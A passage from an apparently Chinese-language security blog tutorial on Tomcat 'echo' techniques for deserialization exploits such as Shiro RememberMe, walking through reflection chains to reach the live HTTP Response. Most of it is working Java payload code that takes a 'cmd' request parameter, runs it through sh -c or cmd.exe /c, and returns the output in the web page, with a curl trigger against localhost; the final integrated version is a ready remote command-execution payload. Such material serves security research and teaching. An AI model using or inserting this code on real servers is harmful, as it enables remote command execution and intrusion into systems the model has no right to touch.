        lastServicedRequestField.set(null, new ThreadLocal<>());
        lastServicedResponseField.set(null, new ThreadLocal<>());
        WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
    } else if (cmd != null) {
        ServletResponse responseFacade = lastServicedResponse.get();
        responseFacade.getWriter();
        java.io.Writer w = responseFacade.getWriter();
        Field responseField = ResponseFacade.class.getDeclaredField("response");
        responseField.setAccessible(true);
        Response response = (Response) responseField.get(responseFacade);
        Field usingWriter = Response.class.getDeclaredField("usingWriter");
        usingWriter.setAccessible(true);
        usingWriter.set((Object) response, Boolean.FALSE);
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        w.write(output);
        w.flush();
    }
触发方式如下，在网页回显中会把命令执行的结果和之前的内容一并输出来。
    curl  'http://127.0.0.1:8080/app/test?cmd=id'
**5\. 局限性分析**
通过完整的学习这个回显方式，可以很明显的发现这个弊端，如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat
Response进行回显。其中Shiro RememberMe反序列化漏洞就遇到了这种情况，相关代码如下  
 **org.apache.catalina.core.ApplicationFilterChain核心代码**
    if (pos req->response
因为在register代码中把RequestInfo注册到了global中
因此如果获取到了global解决问题，global变量为AbstractProtocol静态内部类ConnectionHandler的成员变量。因为改变量不是静态变量，因此我们还是需要找存储AbstractProtocol类或AbstractProtocol子类。现在的获取链变为了
    AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
在调用栈中存在CoyoteAdapter类，其中的connector对象protocolHandler属性为Http11NioProtocol，Http11NioProtocol的handler就是AbstractProtocol$ConnectoinHandler。
    connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
如何获取connector对象就成为了问题所在，Litch1师傅分析出在Tomcat启动过程中会创建connector对象，并通过addConnector函数存放在connectors中
那么现在的获取链变成了
    StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
connectors同样为非静态属性，那么我们就需要获取在tomcat中已经存在的StandardService对象，而不是新创建的对象。
**2\. 关键步骤**
如果能直接获取StandardService对象，那么所有问题都能够迎刃而解。Litch1师傅通过分析Tomcat类加载获取到了想要的答案。
之前我们在《Java安全—JVM类加载》那篇文章中有介绍Tomcat 是如何破坏双亲委派机制的。
>
>
> 首先说明双亲委派机制的缺点是，当加载同个jar包不同版本库的时候，该机制无法自动选择需要版本库的jar包。特别是当Tomcat等web容器承载了多个业务之后，不能有效的加载不同版本库。为了解决这个问题，Tomcat放弃了双亲委派模型。
>
> 当时分析Shiro反序列化的时候，遇到了Tomcat的类加载器重写了loadClass函数，从而没有严格按照双亲委派机制进行类加载，这样才能实现加载多个相同类，相当于提供了一套隔离机制，为每个web容器提供一个单独的WebAppClassLoader加载器。
>
> Tomcat加载机制简单讲，WebAppClassLoader负责加载本身的目录下的class文件，加载不到时再交给CommonClassLoader加载，这和双亲委派刚好相反。
>  
如果在SpringBoot项目中调试看下Thread. _currentThread_ ().getContextClassLoader()中的内容
WebappClassLoader里面确实包含了很多很多关于tomcat相关的变量，其中service变量就是要找的StandardService对象。那么至此整个调用链就有了入口点
    WebappClassLoader->resources->context->context->StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
因为这个调用链中一些变量有get方法因此可以通过get函数很方便的执行调用链，对于那些私有保护属性的变量我们只能采用反射的方式动态的获取。
**3\. 代码编写**
**（1）获取Tomcat CloassLoader context**
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
这之后再获取standardContext的context就需要使用反射了  
 **（2）获取standardContext的context**  
因为context不是final变量，因此可以省去一些反射修改操作
具体代码如下
    Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
    context.setAccessible(true);//将变量设置为可访问
    org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)context.get(standardContext);
**（3）获取ApplicationContext的service**
    Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
    service.setAccessible(true);//将变量设置为可访问
    StandardService standardService = (StandardService)service.get(ApplicationContext);
**（4）获取StandardService的connectors**
    Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
    connectorsField.setAccessible(true);//将变量设置为可访问
    org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[])connectorsField.get(standardService);
**（5）获取AbstractProtocol的handler**  
获取到connectors之后，可以通过函数发现getProtocolHandler为public，因此我们可以通直接调用该方法的方式获取到对应的handler。
    org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
    Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
    handlerField.setAccessible(true);
    org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);
**（6）获取内部类ConnectionHandler的global**  
好多师傅们都是通过getDeclaredClasses的方式获取到AbstractProtocol的内部类。笔者通过org.apache.coyote.AbstractProtocol$ConnectionHandler的命名方式，直接使用反射获取该内部类对应字段。
    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
    globalField.setAccessible(true);
    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);
**（7）获取RequestGroupInfo的processors**  
processors为List数组，其中存放的是RequestInfo
    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
    processors.setAccessible(true);
    java.util.List RequestInfolist = (java.util.List) processors.get(global);
**（8）获取Response，并做输出处理**  
遍历获取RequestInfolist中的所有requestInfo，使用反射获取每个requestInfo中的req变量，从而获取对应的response。在getWriter后将usingWriter置为false，并调用flush进行输出。
    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
    req.setAccessible(true);
    for (RequestInfo requestInfo : RequestInfolist) {//遍历
        org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);//获取request
        org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.getNote(1);//获取catalina.connector.Request类型的Request
        org.apache.catalina.connector.Response response2 = request2.getResponse();
        java.io.Writer w = response2.getWriter();//获取Writer
        Field responseField = ResponseFacade.class.getDeclaredField("response");
        responseField.setAccessible(true);
        Field usingWriter = Response.class.getDeclaredField("usingWriter");
        usingWriter.setAccessible(true);
        usingWriter.set(response2, Boolean.FALSE);//初始化
        w.write("1111");
        w.flush();//刷新
    }
**4\. 代码整合**
这个流程下来可以大大锻炼Java反射的使用熟练度。如果按照之前分析的调用链一步一步构造，逻辑相对来说还是比较清晰的。完整代码如下
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webappClassLoaderBase.getResources().getContext();
    Field contextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
    contextField.setAccessible(true);
    org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)contextField.get(standardContext);
    Field serviceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
    serviceField.setAccessible(true);
    org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService)serviceField.get(ApplicationContext);
    Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
    connectorsField.setAccessible(true);
    org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[])connectorsField.get(standardService);
    org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
    Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
    handlerField.setAccessible(true);
    org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);
    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
    globalField.setAccessible(true);
    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);
    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
    processors.setAccessible(true);
    java.util.List RequestInfolist = (java.util.List) processors.get(global);
    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
    req.setAccessible(true);
    for (RequestInfo requestInfo : RequestInfolist) {
        org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);
        org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.getNote(1);
        org.apache.catalina.connector.Response response2 = request2.getResponse();
        java.io.Writer w = response2.getWriter();
        String cmd = request2.getParameter("cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        w.write(output);
        w.flush();
        Field responseField = ResponseFacade.class.getDeclaredField("response");
        responseField.setAccessible(true);
        Field usingWriter = Response.class.getDeclaredField("usingWriter");
        usingWriter.setAccessible(true);
        usingWriter.set(response2, Boolean.FALSE);
    }
**5\. 局限性分析**
利用链过长，会导致http包超长，可先修改org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，这样再次发包的时候就不会有长度限制。还有就是操作复杂可能有性能问题，整体来讲该方法不受各种配置的影响，通用型较强。
## 0x04 总结
主要学习了Tomcat的各种回显技术，重点把如何找Tomcat catalina
Response的过程捋了捋，总的来说通过Tomat类加载器获取Response对象的方法更具有普适性。接下来会继续分析反序列化漏洞后利用的相关技术，内存马驻留技术和查杀技术。
## 参考文章
[https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&a%20cmid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&a%20cmid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3)  